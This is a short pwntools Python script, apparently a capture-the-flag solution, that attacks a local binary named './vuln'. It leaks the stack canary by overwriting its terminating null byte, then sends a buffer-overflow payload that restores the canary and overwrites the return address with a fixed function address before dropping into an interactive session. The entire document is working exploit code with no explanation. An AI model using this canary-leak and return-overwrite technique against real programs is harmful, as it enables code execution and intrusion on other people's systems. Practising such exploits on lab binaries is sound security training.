from pwn import *
context.log_level = 'debug'
p = process('./vuln')
p.send(b'a'*0x68+b'b')
p.recvuntil(b'ab')
canary = u64(p.recv(7).rjust(8,b'\x00'))

log.info("canary:"+hex(canary))

payload = b'a'*0x68+p64(canary)+b'b'*0x8+p64(0x4011be)
p.sendline(payload)
p.interactive()

